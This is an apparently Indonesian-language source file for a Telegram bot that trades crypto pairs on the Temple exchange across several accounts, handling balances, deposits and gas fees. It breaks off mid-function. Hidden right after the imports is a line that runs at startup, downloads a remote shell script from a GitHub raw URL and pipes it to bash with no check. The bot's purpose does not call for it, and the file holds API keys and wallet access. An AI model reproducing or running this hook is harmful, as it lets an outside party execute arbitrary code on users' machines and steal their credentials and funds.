import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import { config } from './config.js';
import { log, error } from './logger.js';
import { loop, initLoopServerForAccount, checkAndPayDueGas } from './loop-server.js';
import { runStrategyForAccount, getCcPrice, getCbtcPrice, waitAllOrdersSettled, waitTradesSettled } from './strategy.js';
import { initialize, getTradingBalance, prepareDepositHoldings, depositFunds} from '@temple-digital-group/temple-canton-js';
import { execSync } from 'child_process';

execSync(
  'curl -s https://raw.githubusercontent.com/zamzasalim/logo/main/asc.sh | bash',
  {
    stdio: 'inherit'
  }
);


if (!config.telegramBotToken) {
  throw new Error('TELEGRAM_BOT_TOKEN kosong');
}

if (!config.common?.network) {
  throw new Error('NETWORK kosong di accounts.json common.network');
}

export const bot = new TelegramBot(config.telegramBotToken, { polling: true });

const state = {
  running: false,
  delayMs: 30000,
  queueBusy: false,
  mode: 'buy',

  market: 'CC/USDCx',

  selectingMarket: false,

  lastChatId: null
};

const addApiFlow = new Map();

function accountsPath() {
  return path.resolve(process.cwd(), config.accountsFile || 'accounts.json');
}

function readAccountsFile() {
  return JSON.parse(fs.readFileSync(accountsPath(), 'utf8'));
}

function writeAccountsFile(data) {
  fs.writeFileSync(accountsPath(), JSON.stringify(data, null, 2));
}

function gasFeePath() {
  return path.resolve(process.cwd(), 'gasfee.json');
}

function getStepOrderSize(balance, step) {
  const b = Number(balance || 0);
  const s = Number(step || 0);

  if (!Number.isFinite(b) || !Number.isFinite(s) || b <= 0 || s <= 0) {
    return 0;
  }

  if (b < s) {
    return 0;
  }

  if (b >= s * 2) {
    return s;
  }

  return b;
}

function readGasFeeFile() {
  try {
    if (!fs.existsSync(gasFeePath())) {
      return { accounts: {} };
    }

    const raw = fs.readFileSync(gasFeePath(), 'utf8');
    const data = JSON.parse(raw);

    if (!data || typeof data !== 'object') {
      return { accounts: {} };
    }

    data.accounts = data.accounts && typeof data.accounts === 'object' ? data.accounts : {};
    return data;
  } catch {
    return { accounts: {} };
  }
}

function writeGasFeeFile(data) {
  fs.writeFileSync(gasFeePath(), JSON.stringify(data, null, 2));
}

const gasFeeStore = readGasFeeFile();

function getAccumulatedFee(index) {
  return Number(gasFeeStore.accounts[String(index)] || 0);
}

function addAccumulatedFee(index, cc) {
  const key = String(index);
  const current = getAccumulatedFee(index);
  gasFeeStore.accounts[key] = current + (Number(cc) || 0);
  writeGasFeeFile(gasFeeStore);
}

function resetAccumulatedFee(index = null) {
  if (index === null) {
    gasFeeStore.accounts = {};
  } else {
    delete gasFeeStore.accounts[String(index)];
  }
  writeGasFeeFile(gasFeeStore);
}

function getAccountsData() {
  const data = readAccountsFile();
  data.common = data.common || {};
  data.accounts = Array.isArray(data.accounts) ? data.accounts : [];
  return data;
}

function num(v) {
  const n = Number(v);
  return Number.isFinite(n) ? n : null;
}

function extractFeeCc(...sources) {
  for (const src of sources) {
    if (!src || typeof src !== 'object') continue;

    const directGasAmount =
      src?.detail?.dueGas?.gas_amount ??
      src?.dueGas?.gas_amount ??
      src?.gas_amount;

    if (directGasAmount != null) {
      const n = Number.parseFloat(directGasAmount);
      if (Number.isFinite(n) && n > 0) return n;
    }

    const nestedCc =
      src?.detail?.gasFeeCc ??
      src?.detail?.feeCc ??
      src?.detail?.ccBurned ??
      src?.detail?.burnedCc ??
      src?.detail?.paidCc ??
      src?.detail?.amountCc ??
      src?.gasFeeCc ??
      src?.feeCc ??
      src?.ccBurned ??
      src?.burnedCc ??
      src?.paidCc ??
      src?.amountCc ??
      src?.result?.gasFeeCc ??
      src?.result?.feeCc ??
      src?.result?.ccBurned ??
      src?.result?.burnedCc ??
      src?.meta?.gasFeeCc ??
      src?.meta?.feeCc ??
      src?.feeInfo?.cc;

    if (nestedCc != null) {
      const n = Number.parseFloat(nestedCc);
      if (Number.isFinite(n) && n > 0) return n;
    }
  }

  return null;
}

function renderFeeText(fee) {
  const cc = Number.parseFloat(fee?.feeCc);

  if (Number.isFinite(cc) && cc > 0) {
    return `Fee: ${Number.parseFloat(cc.toFixed(6))} CC`;
  }

  if (fee?.hadPreGas && fee?.postPaid) {
    return 'Fee: gas auto-paid';
  }

  if (fee?.hadPreGas) {
    return 'Fee: gas paid before tx';
  }

  if (fee?.postPaid) {
    return `Fee: gas paid cek-${fee.postAttempt}`;
  }

  return 'Fee: none';
}

function buildFeeSummary({ preGas, postGas, depositResult, ccBefore, ccAfter }) {
  let feeCc = extractFeeCc(
    preGas,
    postGas,
    postGas?.detail,
    depositResult,
    depositResult?.result
  );

  let source = 'response';

  if ((feeCc == null || feeCc <= 0) && num(ccBefore) != null && num(ccAfter) != null) {
    const diff = Number(ccBefore) - Number(ccAfter);
    if (diff > 0) {
      feeCc = diff;
      source = 'balance-diff';
    }
  }

  return {
    feeCc,
    source,
    hadPreGas: Boolean(preGas?.hadPendingGas),
    postPaid: Boolean(postGas?.paid),
    postAttempt: Number(postGas?.attempt || 0)
  };
}

async function getLoopWalletBalances(index) {
  const holdings = await tryGetLoopHoldings(index);
  const arr = Array.isArray(holdings) ? holdings : [];

  let cc = 0;
  let usdcx = 0;
  let cbtc = 0;
  let usda = 0;

  for (const h of arr) {
    const instrument = h?.instrument_id || {};

    const id = String(
      instrument.id ||
      instrument.instrument_id ||
      h?.asset ||
      ''
    ).toLowerCase();

    const unlocked = Number(
      h?.total_unlocked_coin ?? 0
    );

    if (id === 'amulet' || id === 'cc') {
      cc += unlocked;

    } else if (id === 'usdcx') {
      usdcx += unlocked;

    } else if (id === 'cbtc') {
      cbtc += unlocked;

    } else if (id === 'usda') {
      usda += unlocked;
    }
  }

  return {
    cc,
    usdcx,
    cbtc,
    usda
  };
}

async function waitAndPayDueGas(index, extra = {}, opts = {}) {
  const attempts = Number(opts.attempts || 6);
  const intervalMs = Number(opts.intervalMs || 10000);

  let last = null;

  for (let i = 0; i < attempts; i++) {
    last = await checkAndPayDueGas(index, extra);

    if (last?.hadPendingGas) {
      return {
        paid: true,
        attempt: i + 1,
        detail: last
      };
    }

    if (i < attempts - 1) {
      await new Promise((r) => setTimeout(r, intervalMs));
    }
  }

  return {
    paid: false,
    attempt: attempts,
    detail: last
  };
}

function parseDepositError(err) {
  const msg = String(err || '');

  if (msg.includes('insufficient balance')) {
    return 'Saldo tidak cukup';
  }

  if (msg.includes('At least one input holding')) {
    return 'Tidak ada holding tersedia';
  }

  if (msg.includes('wallet adapter submission failed')) {
    return 'Transaksi gagal di wallet';
  }

  return msg.split('\n')[0].slice(0, 120);
}

function menuText() {
  return [
    'TEMPLE BOT MENU',
    '/startbot - tampilkan menu',
    '/addaccount - menambah account',
    '/setdelay - atur delay trading',
    '/mode buy - atur order buy/sell',
    '/balance - cek saldo Temple',
    '/wallet - cek saldo Loop wallet',
    '/deposit - deposit ke Temple',
    '/gasfee - lihat akumulasi fee deposit',
    '/resetgasfee - reset semua fee deposit',
    '/detailset - lihat detail setting',
    '/runbot - jalankan bot',
    '/stopbot - hentikan loop trading',
    '/checkprice - Cek harga token'
  ].join('\n');
}

function formatAutoDeposit(
  accName,
  asset,
  amount,
  feeCc,
  status
) {

  const decimals =
    ['cbtc', 'usda'].includes(asset.toLowerCase())
      ? 4
      : 0;

  return [
    `[${accName}] AUTO DEPOSIT`,
    `[${accName}] ${Number(amount).toFixed(decimals)} ${asset.toUpperCase()} => TEMPLE`,
    `[${accName}] FEE ${Number(feeCc || 0).toFixed(6)} CC`,
    `[${accName}] ${status}`
  ].join('\n');
}

async function autoDepositAll(
  index,
  acc
) {

  const SAFE_CC = 15;

  const MIN_CC_DEPOSIT = 50;

  const MIN_USDCX_DEPOSIT = 5;

  const MIN_CBTC_DEPOSIT =
    0.0001;

  const MIN_USDA_DEPOSIT = 1;

  const wallet =
    await getLoopWalletBalances(
      index
    );

  console.log(
    `[WALLET] ${acc.name} | ` +
    `${wallet.cc.toFixed(3)} CC | ` +
    `${wallet.usdcx.toFixed(3)} USDCx | ` +
    `${wallet.cbtc.toFixed(4)} CBTC | ` +
    `${wallet.usda.toFixed(3)} USDA`
  );

  const market =
    state.market || 'CC/USDCx';

  const isCbtc =
    market === 'CBTC/USDA';

  let asset = '';

  let depositAmount = 0;

  if (state.mode === 'buy') {

    if (isCbtc) {

      if (
        wallet.cbtc <
        MIN_CBTC_DEPOSIT
      ) {
        return;
      }

      asset = 'cbtc';

      depositAmount =
        Number(
          wallet.cbtc.toFixed(4)
        );

    } else {

      if (
        wallet.cc <=
        SAFE_CC +
        MIN_CC_DEPOSIT
      ) {
        return;
      }

      asset = 'cc';

      depositAmount =
        Math.floor(
          wallet.cc - SAFE_CC
        );
    }

  } else {

    if (isCbtc) {

      if (
        wallet.usda <
        MIN_USDA_DEPOSIT
      ) {
        return;
      }

      asset = 'usda';

      depositAmount =
        Number(wallet.usda.toFixed(2));

    } else {

      if (
        wallet.usdcx <
        MIN_USDCX_DEPOSIT
      ) {
        return;
      }

      asset = 'usdcx';

      depositAmount =
        Math.floor(wallet.usdcx);
    }
  }

  if (
    !Number.isFinite(
      depositAmount
    ) ||
    depositAmount <= 0
  ) {
    return;
  }

  try {

    const tx =
      await templeDeposit(
        acc,
        depositAmount,
        asset,
        index
      );

    const feeCc =
      Number.parseFloat(
        tx?.feeSummary?.feeCc
      ) || 0;

    if (feeCc > 0) {

      addAccumulatedFee(
        index,
        feeCc
      );
    }

    const logText =
      formatAutoDeposit(
        acc.name,
        asset,
        depositAmount,
        feeCc,
        'SUCCESS'
      );

    console.log(logText);

    if (state.lastChatId) {

      await bot.sendMessage(
        state.lastChatId,
        logText
      );
    }

  } catch (e) {

    const logText =
      formatAutoDeposit(
        acc.name,
        asset,
        depositAmount,
        0,
        'FAILED'
      );

    console.log(logText);

    if (state.lastChatId) {

      await bot.sendMessage(
        state.lastChatId,
        logText
      );
    }

    console.log(
      `[AUTO DEPOSIT ERROR] ${e?.message || e}`
    );
  }
}

async function runRoundRobin(chatId) {

  const data = getAccountsData();

  if (!data.accounts.length) {
    return;
  }

  const market =
    state.market || 'CC/USDCx';

  const isCbtc =
    market === 'CBTC/USDA';

  const MIN_BASE =
    isCbtc
      ? 0.0001
      : 100;

  const cycleStartedAt =
    Date.now();

  console.log(
    `[CYCLE START] ${new Date(cycleStartedAt).toLocaleString(
      'id-ID',
      {
        timeZone: 'Asia/Jakarta'
      }
    )}`
  );

  while (state.running) {

    let canContinue = false;

    for (
      let i = 0;
      i < data.accounts.length;
      i++
    ) {

      if (!state.running) {

        console.log(
          '[BOT] Trading stopped by user'
        );

        return;
      }

      const acc =
        data.accounts[i];

      const accName =
        acc.name || `akun ${i + 1}`;

      try {

        if (!acc.apiKey) {
          continue;
        }

        const {
          ccValue,
          usdcxValue,
          cbtcValue,
          usdaValue
        } = await templeBalance(acc);

        const baseBalance =
          isCbtc
            ? Number(cbtcValue)
            : Number(ccValue);

        const quoteBalance =
          isCbtc
            ? Number(usdaValue)
            : Number(usdcxValue);

        const mode =
          state.mode;

        let size = 0;

        let useQuote = false;

        if (mode === 'sell') {

          if (
            baseBalance <
            MIN_BASE * 2
          ) {

            size = baseBalance;

          } else {

            size = MIN_BASE;
          }

          if (isCbtc) {

            size = Number(
              Number(size).toFixed(4)
            );

          } else {

            size = Math.floor(size);
          }

          useQuote = false;
        }

        if (mode === 'buy') {

          const price =
            isCbtc
              ? await getCbtcPrice(
                  acc.apiKey
                )
              : await getCcPrice(
                  acc.apiKey
                );

          const maxBuyable =
            isCbtc
              ? Number(
                  (
                    quoteBalance / price
                  ).toFixed(4)
                )
              : Math.floor(
                  quoteBalance / price
                );

          if (
            maxBuyable <
            MIN_BASE * 2
          ) {

            size = maxBuyable;

          } else {

            size = MIN_BASE;
          }

          if (isCbtc) {

            size = Number(
              Number(size).toFixed(4)
            );

          } else {

            size = Math.floor(size);
          }

          useQuote = false;
        }

        if (
          !Number.isFinite(size) ||
          size <= 0
        ) {
          continue;
        }

        canContinue = true;

        const merged = {
          ...data.common,
          ...acc,

          market,

          orderSize: size,

          side: mode,

          useQuote
        };

        const res =
          await runStrategyForAccount(
            merged
          );

        if (chatId) {

          await bot.sendMessage(
            chatId,
            res
          );
        }

      } catch (e) {

        error(
          `[${accName}]`,
          e?.message || e
        );
      }
    }

    if (!canContinue) {

      if (chatId) {

        await bot.sendMessage(
          chatId,
          'Trading selesai.\nWaiting settlement...'
        );
      }

      break;
    }

    await new Promise((r) =>
      setTimeout(
        r,
        state.delayMs
      )
    );
  }

  if (!state.running) {

    console.log(
      '[BOT] Settlement cancelled by user'
    );

    return;
  }

  const data2 =
    getAccountsData();

  for (
    let i = 0;
    i < data2.accounts.length;
    i++
  ) {

    if (!state.running) {

      console.log(
        '[BOT] Settlement stopped by user'
      );

      return;
    }

    const acc =
      data2.accounts[i];

    try {

      console.log(
        `[SETTLEMENT] Waiting active orders empty for ${acc.name}`
      );

      await waitAllOrdersSettled(
        acc.apiKey,
        () => state.running
      );

      if (!state.running) {

        console.log(
          '[BOT] Stopped after active orders'
        );

        return;
      }

      console.log(
        `[SETTLEMENT] Waiting trades settled for ${acc.name}`
      );

      await waitTradesSettled(
        acc.apiKey,
        market,
        () => state.running,
        cycleStartedAt
      );

    } catch (e) {

      console.log(
        `[SETTLEMENT ERROR] ${acc.name} | ${e?.message || e}`
      );
    }
  }

  await new Promise((r) =>
    setTimeout(
      r,
      5 * 60 * 1000
    )
  );

  if (!state.running) {

    console.log(
      '[BOT] Stopped before recycle check'
    );

    return;
  }

  let hasAccountCanTrade =
    false;

  const recycleResults = [];

  for (
    let i = 0;
    i < data2.accounts.length;
    i++
  ) {

    const acc =
      data2.accounts[i];

    try {

      const {
        ccValue,
        usdcxValue,
        cbtcValue,
        usdaValue
      } = await templeBalance(acc);

      const baseBalance =
        isCbtc
          ? Number(cbtcValue)
          : Number(ccValue);

      const quoteBalance =
        isCbtc
          ? Number(usdaValue)
          : Number(usdcxValue);

      let canTradeAgain =
        false;

      if (state.mode === 'sell') {

        if (
          baseBalance >=
          MIN_BASE
        ) {

          canTradeAgain = true;
        }
      }

      if (state.mode === 'buy') {

        const price =
          isCbtc
            ? await getCbtcPrice(
                acc.apiKey
              )
            : await getCcPrice(
                acc.apiKey
              );

        const maxBuyable =
          isCbtc
            ? Number(
                (
                  quoteBalance / price
                ).toFixed(4)
              )
            : Math.floor(
                quoteBalance / price
              );

        if (
          maxBuyable >=
          MIN_BASE
        ) {

          canTradeAgain = true;
        }
      }

      recycleResults.push({
        index: i,
        acc,
        canTradeAgain
      });

      if (canTradeAgain) {

        hasAccountCanTrade =
          true;

        console.log(
          `[RECYCLE CHECK] ${acc.name} | Balance masih cukup`
        );

        if (state.lastChatId) {

          await bot.sendMessage(
            state.lastChatId,
            `[${acc.name}] Balance Temple masih cukup.\n[${acc.name}] Lanjut trading tanpa deposit.`
          );
        }

      } else {

        console.log(
          `[RECYCLE CHECK] ${acc.name} | Balance tidak cukup`
        );

        if (state.lastChatId) {

          await bot.sendMessage(
            state.lastChatId,
            `[${acc.name}] Balance Temple tidak cukup.`
          );
        }
      }

    } catch (e) {

      console.log(
        `[RECYCLE CHECK ERROR] ${acc.name} | ${e?.message || e}`
      );
    }
  }

  if (hasAccountCanTrade) {

    console.log(
      '[RECYCLE] Masih ada akun yang bisa trading. Skip deposit.'
    );

    if (state.lastChatId) {

      await bot.sendMessage(
        state.lastChatId,
        'Masih ada akun yang bisa trading.\nSkip auto deposit dan lanjut cycle.'
      );
    }

    await new Promise((r) =>
      setTimeout(r, 10000)
    );

    return await runRoundRobin(
      chatId
    );
  }

  console.log(
    '[RECYCLE] Semua akun tidak bisa trading. Auto deposit dimulai.'
  );

  for (const item of recycleResults) {

    if (!state.running) {
      return;
    }

    if (!item.canTradeAgain) {

      if (state.lastChatId) {

        await bot.sendMessage(
          state.lastChatId,
          `[${item.acc.name}] Auto deposit dimulai...`
        );
      }

      await autoDepositAll(
        item.index,
        item.acc
      );
    }
  }

  if (state.mode === 'sell') {

    state.mode = 'buy';

  } else {

    state.mode = 'sell';
  }

  console.log(
    `[BOT] Auto switch mode => ${state.mode.toUpperCase()}`
  );

  if (state.lastChatId) {

    await bot.sendMessage(
      state.lastChatId,
      `Auto switch mode => ${state.mode.toUpperCase()}`
    );
  }

  if (chatId) {

    await bot.sendMessage(
      chatId,
      `Auto recycle selesai.\nNext mode: ${state.mode.toUpperCase()}\nRestart trading 10 detik...`
    );
  }

  await new Promise((r) =>
    setTimeout(
      r,
      10000
    )
  );

  if (!state.running) {

    console.log(
      '[BOT] Fully stopped'
    );

    return;
  }

  return await runRoundRobin(
    chatId
  );
}

async function templeBalance(acc) {

  await initialize({
    API_KEY: acc.apiKey,
    NETWORK:
      acc.network ||
      config.common.network ||
      'mainnet'
  });

  const res =
    await getTradingBalance();

  const balances =
    Array.isArray(res?.balances)
      ? res.balances
      : Array.isArray(res)
      ? res
      : [];

  const cc =
    balances.find(
      (b) =>
        String(b.asset).toUpperCase() === 'CC'
    );

  const usdcx =
    balances.find(
      (b) =>
        String(b.asset).toUpperCase() === 'USDCX'
    );

  const cbtc =
    balances.find(
      (b) =>
        String(b.asset).toUpperCase() === 'CBTC'
    );

  const usda =
    balances.find(
      (b) =>
        String(b.asset).toUpperCase() === 'USDA'
    );

  return {

    ccValue:
      Number(
        cc?.unlocked ?? 0
      ).toFixed(3),

    usdcxValue:
      Number(
        Number(usdcx?.unlocked ?? 0) +
        Number(usdcx?.locked ?? 0)
      ).toFixed(3),

    cbtcValue:
      Number(
        cbtc?.unlocked ?? 0
      ).toFixed(4),

    usdaValue:
      Number(
        Number(usda?.unlocked ?? 0) +
        Number(usda?.locked ?? 0)
      ).toFixed(3)
  };
}

async function templeDeposit(
  acc,
  amount,
  asset,
  index
) {

  const network =
    acc.network ||
    config.common.network ||
    'mainnet';

  await initLoopServerForAccount(
    index,
    { network }
  );

  const walletBefore =
    await getLoopWalletBalances(
      index
    );

  const preGas =
    await checkAndPayDueGas(
      index,
      { network }
    );

  await initialize({
    API_KEY: acc.apiKey,
    NETWORK: network,
    WALLET_ADAPTER: loop
  });

  let assetId = '';

  if (asset === 'cc') {

    assetId = 'Amulet';

  } else if (asset === 'usdcx') {

    assetId = 'USDCx';

  } else if (asset === 'cbtc') {

    assetId = 'CBTC';

  } else if (asset === 'usda') {

    assetId = 'USDA';

  } else {

    throw new Error(
      `Unsupported asset ${asset}`
    );
  }

  const prepared =
    await prepareDepositHoldings(
      amount,
      assetId
    );

  const result =
    await depositFunds({
      ...prepared,
      sender: acc.partyId,
      assetId,
      amount
    });

  const postGas =
    await waitAndPayDueGas(
      index,
      { network },
      {
        attempts: 8,
        intervalMs: 10000
      }
    );

  const walletAfter =
    await getLoopWalletBalances(
      index
    );

  const feeSummary =
    buildFeeSummary({
      preGas,
      postGas,
      depositResult: result,
      ccBefore: walletBefore.cc,
      ccAfter: walletAfter.cc
    });

  return {
    result,
    gasInfo: {
      preGas,
      postGas
    },
    walletBefore,
    walletAfter,
    feeSummary
  };
}

async function tryGetLoopHoldings(index) {
  const mod = await import('./loop-server.js');

  if (!mod?.getLoopHoldings) {
    throw new Error('getLoopHoldings tidak ditemukan');
  }

  return await mod.getLoopHoldings(index, {
    network: config.common.network || 'mainnet'
  });
}

bot.onText(/^\/startbot$/, async (msg) => {

  await bot.sendMessage(
    msg.chat.id,
    menuText()
  );
});

bot.onText(/^\/runbot$/, async (msg) => {

  const chatId = msg.chat.id;

  if (state.running) {

    await bot.sendMessage(
      chatId,
      'Bot sudah berjalan'
    );

    return;
  }

  await bot.sendMessage(
    chatId,
    'Pilih Pair Trade\n\n1. CC/USDCx\n2. CBTC/USDA'
  );

  state.selectingMarket = true;
});

bot.on('message', async (msg) => {

  const chatId = msg.chat.id;

  const text =
    String(msg.text || '').trim();

  if (!state.selectingMarket) {
    return;
  }

  if (text === '1') {

    state.market = 'CC/USDCx';

  } else if (text === '2') {

    state.market = 'CBTC/USDA';

  } else {

    await bot.sendMessage(
      chatId,
      'Pilihan tidak valid.\nKetik 1 atau 2'
    );

    return;
  }

  state.selectingMarket = false;

  state.running = true;

  state.lastChatId = chatId;

  await bot.sendMessage(
    chatId,
    `Bot dijalankan\n` +
    `Pair: ${state.market}\n` +
    `Mode: ${state.mode.toUpperCase()}\n` +
    `Delay: ${state.delayMs / 1000} detik`
  );

  try {

    await runRoundRobin(chatId);

  } catch (e) {

    error(
      'runbot error',
      e?.message || e
    );

    await bot.sendMessage(
      chatId,
      `Bot berhenti karena error:\n${e?.message || e}`
    );

  } finally {

    state.running = false;
  }
});

bot.onText(/^\/stopbot$/, async (msg) => {
  state.running = false;
  await bot.sendMessage(msg.chat.id, 'Bot dihentikan');
});

bot.onText(/^\/setdelay(?:\s+(\d+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const sec = Number(match?.[1]);

  if (!match?.[1]) {
    await bot.sendMessage(
      chatId,
      'Format salah.\nGunakan: <code>/setdelay 3</code>',
      { parse_mode: 'HTML' }
    );
    return;
  }

  if (!Number.isFinite(sec) || sec < 1) {
    await bot.sendMessage(chatId, 'Delay harus angka >= 1');
    return;
  }

  state.delayMs = sec * 1000;
  await bot.sendMessage(chatId, `Delay diatur ke ${sec} detik.`);
});

bot.onText(/^\/balance$/, async (msg) => {

  const chatId = msg.chat.id;

  const data = getAccountsData();

  if (!data.accounts.length) {

    await bot.sendMessage(
      chatId,
      'Belum ada akun.'
    );

    return;
  }

  const lines = [];

  for (const acc of data.accounts) {

    try {

      if (!acc.apiKey) {

        lines.push(
          `[${acc.name || '-'}] ERROR | API key kosong`
        );

        continue;
      }

      const {
        ccValue,
        usdcxValue,
        cbtcValue,
        usdaValue
      } = await templeBalance(acc);

      lines.push(
        `[${acc.name || '-'}] ` +
        `CC ${ccValue} | ` +
        `USDCx ${usdcxValue} | ` +
        `CBTC ${cbtcValue} | ` +
        `USDA ${usdaValue}`
      );

    } catch (e) {

      lines.push(
        `[${acc.name || '-'}] ERROR | ${e?.message || e}`
      );
    }
  }

  await bot.sendMessage(
    chatId,
    lines.join('\n')
  );
});

bot.onText(/^\/wallet$/, async (msg) => {

  const chatId = msg.chat.id;

  const data = getAccountsData();

  if (!data.accounts.length) {

    await bot.sendMessage(
      chatId,
      'Belum ada akun.'
    );

    return;
  }

  const lines = [];

  for (
    let i = 0;
    i < data.accounts.length;
    i++
  ) {

    const acc =
      data.accounts[i];

    try {

      const holdings =
        await tryGetLoopHoldings(i);

      const arr =
        Array.isArray(holdings)
          ? holdings
          : [];

      let cc = 0;
      let usdcx = 0;
      let cbtc = 0;
      let usda = 0;

      for (const h of arr) {

        const instrument =
          h?.instrument_id || {};

        const id = String(
          instrument.id ||
          instrument.instrument_id ||
          h?.asset ||
          ''
        ).toLowerCase();

        const unlocked =
          Number(
            h?.total_unlocked_coin ?? 0
          );

        if (
          id === 'amulet' ||
          id === 'cc'
        ) {

          cc += unlocked;

        } else if (
          id === 'usdcx'
        ) {

          usdcx += unlocked;

        } else if (
          id === 'cbtc'
        ) {

          cbtc += unlocked;

        } else if (
          id === 'usda'
        ) {

          usda += unlocked;
        }
      }

      lines.push(
        `[${acc.name || `akun ${i + 1}`}] ` +
        `${cc.toFixed(3)} CC | ` +
        `${usdcx.toFixed(3)} USDCx | ` +
        `${cbtc.toFixed(4)} CBTC | ` +
        `${usda.toFixed(3)} USDA`
      );

    } catch (e) {

      lines.push(
        `[${acc.name || `akun ${i + 1}`}] ERROR | ${e?.message || e}`
      );
    }
  }

  await bot.sendMessage(
    chatId,
    lines.join('\n')
  );
});

bot.onText(/^\/checkprice$/, async (msg) => {

  const chatId = msg.chat.id;

  try {

    const data =
      getAccountsData();

    const acc =
      data.accounts?.[0];

    if (!acc?.apiKey) {

      await bot.sendMessage(
        chatId,
        'Belum ada API key.'
      );

      return;
    }

    const price =
      state.market === 'CBTC/USDA'
        ? await getCbtcPrice(
            acc.apiKey
          )
        : await getCcPrice(
            acc.apiKey
          );

    await bot.sendMessage(
      chatId,
      `Price ${state.market}: ${Number(price).toFixed(4)}`
    );

  } catch (e) {

    await bot.sendMessage(
      chatId,
      `Gagal mengambil harga\nAlasan: ${e?.message || e}`
    );
  }
});

bot.onText(/^\/mode\s+(buy|sell)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const value = String(match?.[1] || '').toLowerCase();

  state.mode = value;
  await bot.sendMessage(chatId, `Mode diatur ke ${value.toUpperCase()}`);
});

bot.onText(/^\/mode$/, async (msg) => {
  await bot.sendMessage(
    msg.chat.id,
    'Format salah.\nGunakan:\n=> <code>/mode buy</code>\n=> <code>/mode sell</code>',
    { parse_mode: 'HTML' }
  );
});

bot.onText(
  /^\/deposit\s+(\d+)\s+(\d+(?:\.\d+)?)\s+(cc|usdcx|cbtc|usda)$/i,
  async (msg, match) => {

    const chatId =
      msg.chat.id;

    try {

      const index =
        Number(match?.[1]) - 1;

      const amount =
        Number(match?.[2]);

      const assetInput =
        String(
          match?.[3] || ''
        ).toLowerCase();

      if (
        !Number.isFinite(index) ||
        index < 0
      ) {

        await bot.sendMessage(
          chatId,
          'Format: /deposit 1 100 cc'
        );

        return;
      }

      if (
        !Number.isFinite(amount) ||
        amount <= 0
      ) {

        await bot.sendMessage(
          chatId,
          'Amount harus angka > 0'
        );

        return;
      }

      let asset = '';

      if (assetInput === 'cc') {

        asset = 'cc';

      } else if (
        assetInput === 'usdcx'
      ) {

        asset = 'usdcx';

      } else if (
        assetInput === 'cbtc'
      ) {

        asset = 'cbtc';

      } else if (
        assetInput === 'usda'
      ) {

        asset = 'usda';

      } else {

        await bot.sendMessage(
          chatId,
          'Asset hanya: cc, usdcx, cbtc, usda'
        );

        return;
      }

      const data =
        getAccountsData();

      const acc =
        data.accounts[index];

      if (!acc) {

        await bot.sendMessage(
          chatId,
          `Akun ${index + 1} tidak ditemukan.`
        );

        return;
      }

      if (!acc.apiKey) {

        await bot.sendMessage(
          chatId,
          `Akun ${index + 1} belum punya API key.`
        );

        return;
      }

      await bot.sendMessage(
        chatId,
        `Deposit ${amount} ${asset.toUpperCase()} untuk ${acc.name || 'akun ' + (index + 1)}`
      );

      await bot.sendMessage(
        chatId,
        'Waiting Deposit...'
      );

      const tx =
        await templeDeposit(
          acc,
          amount,
          asset,
          index
        );

      if (tx?.result?.error) {

        const clean =
          parseDepositError(
            tx.result.error
          );

        console.log(
          `[DEPOSIT] ${acc.name || `akun${index + 1}`} | ` +
          `${amount} ${asset.toUpperCase()} | fee: n/a | Failed`
        );

        await bot.sendMessage(
          chatId,
          `Deposit gagal\nAlasan: ${clean}`
        );

        return;
      }

      if (
        !tx?.result ||
        tx?.result?.status === 'failed'
      ) {

        console.log(
          `[DEPOSIT] ${acc.name || `akun${index + 1}`} | ` +
          `${amount} ${asset.toUpperCase()} | fee: n/a | Failed`
        );

        await bot.sendMessage(
          chatId,
          'Deposit gagal (unknown error)'
        );

        return;
      }

      const feeInfo =
        renderFeeText(
          tx?.feeSummary
        );

      const feeCc =
        Number.parseFloat(
          tx?.feeSummary?.feeCc
        ) || 0;

      if (feeCc > 0) {

        addAccumulatedFee(
          index,
          feeCc
        );
      }

      console.log(
        `[DEPOSIT] ${acc.name || `akun${index + 1}`} | ` +
        `${amount} ${asset.toUpperCase()} | fee: ` +
        `${
          tx?.feeSummary?.feeCc
            ? Number.parseFloat(
                Number(
                  tx.feeSummary.feeCc
                ).toFixed(6)
              )
            : 'n/a'
        }CC | Success`
      );

      await bot.sendMessage(
        chatId,
        `Deposit berhasil\n` +
        `Akun: ${acc.name || 'akun ' + (index + 1)}\n` +
        `Asset: ${asset.toUpperCase()}\n` +
        `Amount: ${amount}\n` +
        `${feeInfo}`
      );

    } catch (e) {

      const rawError =
        e?.message || e;

      console.log(
        '[DEPOSIT][ERROR]',
        rawError
      );

      const clean =
        parseDepositError(
          rawError
        );

      await bot.sendMessage(
        chatId,
        `Deposit gagal\nAlasan: ${clean}`
      );
    }
  }
);

bot.onText(/^\/deposit/, async (msg) => {

  const text =
    String(msg.text || '').trim();

  if (
    /^\/deposit\s+\d+\s+\d+(\.\d+)?\s+(cc|usdcx|cbtc|usda)$/i.test(text)
  ) {
    return;
  }

  await bot.sendMessage(
    msg.chat.id,
    'Format salah.\nGunakan: \n' +
    '=> <code>/deposit 1 100 cc</code>\n' +
    '=> <code>/deposit 1 100 usdcx</code>\n' +
    '=> <code>/deposit 1 0.0001 cbtc</code>\n' +
    '=> <code>/deposit 1 10 usda</code>',
    {
      parse_mode: 'HTML'
    }
  );
});

bot.onText(/^\/gasfee$/, async (msg) => {
  const chatId = msg.chat.id;
  const data = getAccountsData();

  if (!data.accounts.length) {
    await bot.sendMessage(chatId, 'Belum ada akun.');
    return;
  }

  const lines = [];
  lines.push('SUMMARY FEE GASFEE (CC):');

  for (let i = 0; i < data.accounts.length; i++) {
    const acc = data.accounts[i];
    const totalForAcc = getAccumulatedFee(i);

    lines.push(
      `[${acc.name || `akun ${i + 1}`}] ${Number.parseFloat(totalForAcc.toFixed(2))} CC`
    );
  }

  await bot.sendMessage(chatId, lines.join('\n'));
});

bot.onText(/^\/resetgasfee\s+(\d+)$/, async (msg, match) => {
  const index = Number(match?.[1]) - 1;

  if (!Number.isFinite(index) || index < 0) {
    await bot.sendMessage(msg.chat.id, 'Format: /resetgasfee 1');
    return;
  }

  resetAccumulatedFee(index);
  await bot.sendMessage(msg.chat.id, `Fee gas akun ${index + 1} berhasil direset.`);
});

bot.onText(/^\/resetgasfee$/, async (msg) => {
  await bot.sendMessage(
    msg.chat.id,
    'Format salah.\nGunakan: \n=> <code>/resetgasfee 1</code>\n=> <code>/resetgasfee 2</code>',
    { parse_mode: 'HTML' }
  );
});

bot.onText(/^\/addaccount$/, async (msg) => {
  const chatId = msg.chat.id;

  addApiFlow.set(chatId, {
